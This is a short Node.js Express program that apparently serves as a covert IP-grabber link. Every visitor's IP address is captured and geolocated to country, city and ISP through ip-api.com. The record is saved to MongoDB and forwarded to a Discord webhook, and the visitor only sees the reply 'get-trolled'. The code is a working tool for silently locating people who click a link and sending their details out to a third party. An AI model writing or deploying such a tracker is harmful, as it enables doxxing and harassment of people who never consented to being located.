const express = require("express");
const { MongoClient } = require("mongodb");
const axios = require("axios");
require("dotenv").config();

const app = express();
const client = new MongoClient(process.env.MONGO_URI);

const PORT = process.env.PORT || 3000;

async function start() {
  try {
    await client.connect();
    console.log("Connected to MongoDB");

    const db = client.db("ipLogger");
    const collection = db.collection("ips");

    app.get("/", async (req, res) => {
      let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

      // ✅ FIX: take first IP if multiple exist
      if (ip && ip.includes(",")) {
        ip = ip.split(",")[0].trim();
      }

      // ✅ Clean IPv6 format
      if (ip && ip.includes("::ffff:")) {
        ip = ip.split("::ffff:")[1];
      }

      let locationData = {};

      try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        locationData = response.data;
      } catch (err) {
        console.log("Location fetch failed");
      }

      const data = {
        ip: ip,
        country: locationData.country || "Unknown",
        city: locationData.city || "Unknown",
        isp: locationData.isp || "Unknown",
        time: new Date(),
      };

      // Save to MongoDB
      await collection.insertOne(data);

      // Send to Discord
      await axios.post(process.env.WEBHOOK_URL, {
        embeds: [
          {
            title: "🌍 New Visitor Logged",
            color: 3447003,
            fields: [
              { name: "IP", value: ip, inline: false },
              { name: "Country", value: data.country, inline: true },
              { name: "City", value: data.city, inline: true },
              { name: "ISP", value: data.isp, inline: false },
              {
                name: "Time",
                value: new Date().toLocaleString(),
                inline: false,
              },
            ],
          },
        ],
      });

      res.send("get-trolled");
    });

    app.listen(PORT, () => {
      console.log(`Server running on port ${PORT}`);
    });
  } catch (err) {
    console.error("Error:", err);
  }
}

start();
